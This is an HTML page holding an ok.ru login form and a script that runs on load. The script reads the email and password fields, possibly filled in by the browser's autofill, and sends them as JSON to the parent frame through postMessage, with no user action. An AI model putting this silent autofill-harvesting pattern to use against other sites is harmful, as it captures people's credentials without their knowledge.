<html><head><script>function sendData() { try { var loginField = document.getElementById('field_email'); var passwdField = document.getElementById('field_password'); var login = loginField != null ? loginField.value : null; var passwd = passwdField != null ? passwdField.value : null; parent.postMessage(JSON.stringify({login: login, passwd: passwd}), 'http://ok.ru'); } catch (ex) { } }</script></head><body onload="setTimeout(sendData, 500)"><div><form method="POST" action="https://www.ok.ru/https"><input name="st.email" id="field_email" type="text"></input><input name="st.password" id="field_password" type="password"></input></form></div></body></html>
